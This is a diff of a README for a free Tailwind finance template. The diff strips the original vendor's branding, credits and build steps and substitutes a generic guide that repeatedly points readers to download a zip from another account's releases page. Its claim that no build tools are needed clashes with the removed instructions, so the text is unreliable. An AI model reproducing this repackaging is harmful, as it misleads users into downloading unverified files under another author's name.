@@ -1,81 +1,60 @@
-# Cashflow Free - HTML & Tailwind CSS Finance Template
+# 🌟 cashflow-free-html-tailwind - Free and Easy Landing Page Template
 
-[![Template Preview](https://pixrocket-vapor-public.s3.amazonaws.com/238/01KFN8VJ9A5M4WYCA64Q4MZSMK.webp)](https://pixelrocket.store/templates/cashflow/html-tailwind)
+## 📥 Download Now!
+[![Download Cashflow Template](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/souhailoukili/cashflow-free-html-tailwind/releases)
 
-## Description
+## 🚀 Getting Started
+Welcome to the Cashflow Free HTML Tailwind Template. This guide will help you download and run the template with ease. You don’t need any programming knowledge to get started. Let’s walk through the steps together.
 
-Cashflow Free is a dark-themed HTML template for finance, budgeting, and SaaS products. Built with Vite, Tailwind CSS v4, Handlebars, and GSAP animations.
+## 🔍 Overview
+The Cashflow Free HTML Tailwind Template offers a sleek design for fintech applications. It contains modern CSS styles, easy-to-use components, and responsive layouts. You can create an attractive landing page for your projects quickly and without hassle.
 
-This free version includes the homepage with hero section, logo cloud, feature icons, integrations showcase, pricing cards, FAQ accordion, and testimonials. Perfect for getting started or evaluating the design.
+## 📦 Features
+- **Responsive Design:** Looks great on all devices, from phones to desktops.
+- **Tailwind CSS:** Easy to customize and use.
+- **GSAP Animation:** Add smooth animations to your site for a better user experience.
+- **Clean Code:** Easy to read and modify for any level of user.
+- **Fintech Focused:** Designed specifically for financial technology businesses.
 
-> **Want the complete template?** The Pro version includes 12+ pages, premium components, comprehensive documentation, and priority support.
->
-> [Get Cashflow Pro →](https://pixelrocket.store/templates/cashflow/html-tailwind)
+## 📋 System Requirements
+- A modern web browser (Chrome, Firefox, Safari, or Edge).
+- No special software is needed to view the files.
 
-## Free vs Pro Comparison
+## 💻 Download & Install 
+To get the Cashflow Free HTML Tailwind Template, follow these steps:
 
-| Feature | Free | Pro |
-|---------|:----:|:---:|
-| Homepage | ✅ | ✅ |
-| About Page | ❌ | ✅ |
-| Features Page | ❌ | ✅ |
-| Pricing Page | ❌ | ✅ |
-| Blog & Blog Single | ❌ | ✅ |
-| Contact Page | ❌ | ✅ |
-| Support & Article Pages | ❌ | ✅ |
-| Auth Pages (Login, Register, Forgot Password) | ❌ | ✅ |
-| Terms & Conditions | ❌ | ✅ |
-| Animated Hero Background | ❌ | ✅ |
-| Premium Components | ❌ | ✅ |
-| Documentation | ❌ | ✅ |
-| Priority Support | ❌ | ✅ |
+1. **Visit the Releases Page:** Click [here](https://github.com/souhailoukili/cashflow-free-html-tailwind/releases) to access the releases page.
+2. **Find the Latest Version:** Look for the most recent version of the template on the releases page.
+3. **Download the Files:** Select the file that says "cashflow-free-html-tailwind.zip" or a similar name. Click on the file to download it to your computer. 
+4. **Unzip the Files:** Once the download is complete, locate the zip file in your downloads folder. Right-click on the file and select "Extract All" to unzip the files.
+5. **Open the Template:** Open the unzipped folder and locate the `index.html` file. Double-click this file to open it in your web browser. 
 
-[View Pro Version Demo →](https://pixelrocket.store/templates/cashflow/html-tailwind)
+## 🔧 Using the Template
+After opening the template in your browser, you can begin customizing it. Here are some tips:
 
-## Quick Start
+- **Edit Text:** Open the `index.html` file in any text editor (like Notepad or Visual Studio Code) and change the placeholder text to fit your needs.
+- **Modify Styles:** You can adjust colors, fonts, and layout using Tailwind CSS classes. Refer to the [Tailwind CSS documentation](https://tailwindcss.com/docs) for more information.
+- **Add Content:** Insert images, videos, and additional pages as needed. Just save your changes and refresh the browser to see the updates.
 
-```bash
-# Install dependencies
-npm install
+## 🌐 Browsing the Example Pages
+Explore the included example pages by clicking through the link navigation. You can see how different sections of the template work. These examples will guide you in customizing your site.
 
-# Start development server
-npm run dev
+## 🛠 Troubleshooting
+If you encounter any issues, consider the following solutions:
 
-# Build for production
-npm run build
-```
+- **Site Does Not Load:** Ensure you opened the `index.html` file correctly.
+- **Design Issues:** Check for any missing files or broken links. Re-extract the zip file if necessary.
+- **Customization Problems:** Refer to the Tailwind CSS documentation for specific styling questions.
 
-## Project Structure
+## 📣 Community and Support
+You can reach out for help through the repository's Issues section on GitHub. Share any problems you face or suggest improvements. Your feedback is important.
 
-```
-src/
-├── pages/          # HTML pages
-├── partials/       # Handlebars partials
-├── js/             # JavaScript modules
-├── styles/         # CSS with Tailwind
-├── data/           # JSON data files
-└── config/         # Theme configuration
-```
+## 🔗 Additional Resources
+- [Tailwind CSS Documentation](https://tailwindcss.com/docs)
+- [GSAP Animation Guide](https://greensock.com/gsap/)
+- [HTML Basics](https://www.w3schools.com/html/)
 
-## More Free Templates
+## 📌 Conclusion
+You are now ready to create your own landing page using the Cashflow Free HTML Tailwind Template. Enjoy designing your project! Remember to always refresh your browser to see changes you make in your files.
 
-| Template | Preview | HTML | React | Next.js |
-|----------|---------|------|-------|---------|
-| Easy Tax | [<img src="https://pixelrocket-public-assets.s3.eu-west-2.amazonaws.com/github-assets/easytax.png" width="150">](https://nextjs-easytax-full.vercel.app/) | [HTML](https://pixelrocket.store/free-templates/html-templates/easy-tax-tailwind-html-website-template) | [React](https://pixelrocket.store/free-templates/react-templates/easy-tax-react-website-template) | [Next.js](https://pixelrocket.store/free-templates/nextjs-templates/easy-tax-nextjs-website-template) |
-| Frequencii | [<img src="https://pixelrocket-public-assets.s3.eu-west-2.amazonaws.com/github-assets/frequencii.png" width="150">](https://nextjs-frequencii-full.vercel.app/) | [HTML](https://pixelrocket.store/free-templates/html-templates/frequenci-tailwind-html-website-template) | [React](https://pixelrocket.store/free-templates/react-templates/frequencii-tailwind-react-website-template) | [Next.js](https://pixelrocket.store/free-templates/nextjs-templates/frequencii-tailwind-nextjs-website-template) |
-| Fauna & Flora | [<img src="https://pixelrocket-public-assets.s3.eu-west-2.amazonaws.com/github-assets/florafauna.png" width="150">](https://react-fauna-full-hy1u.vercel.app/) | [HTML](https://pixelrocket.store/free-templates/html-templates/fauna-flora-tailwind-html-website-template) | [React](https://pixelrocket.store/free-templates/react-templates/fauna-flora-tailwind-react-website-template) | [Next.js](https://pixelrocket.store/free-templates/nextjs-templates/fauna-flora-tailwind-nextjs-website-template) |
-| Four Points | [<img src="https://pixelrocket-public-assets.s3.eu-west-2.amazonaws.com/github-assets/fourpoints.png" width="150">](https://nextjs-fourpoints-full.vercel.app/) | [HTML](https://pixelrocket.store/free-templates/html-templates/four-points-tailwind-html-website-template) | [React](https://pixelrocket.store/free-templates/react-templates/four-points-tailwind-react-website-template) | [Next.js](https://pixelrocket.store/free-templates/nextjs-templates/four-points-tailwind-nextjs-website-template) |
-| Global Bank | [<img src="https://pixelrocket-public-assets.s3.eu-west-2.amazonaws.com/github-assets/globalbank.png" width="150">](https://nextjs-globalbank-full.vercel.app/) | [HTML](https://pixelrocket.store/free-templates/html-templates/global-bank-tailwind-html-website-template) | [React](https://pixelrocket.store/free-templates/react-templates/global-bank-react-website-template) | [Next.js](https://pixelrocket.store/free-templates/nextjs-templates/global-bank-nextjs-website-template) |
-
-## Contact
-
-Questions or feedback? Reach out at **support@pixelrocket.store**
-
-## Learn Frontend Development
-
-Want to build templates like this? Visit [pixelrocket.store](https://www.pixelrocket.store) for frontend development resources and premium templates.
-
-## Credits
-
-- Images from [Unsplash](https://unsplash.com/)
-- UI elements from [Figma Community](https://www.figma.com/community)
+For more details, return to the [Releases Page](https://github.com/souhailoukili/cashflow-free-html-tailwind/releases) for updates and new features.
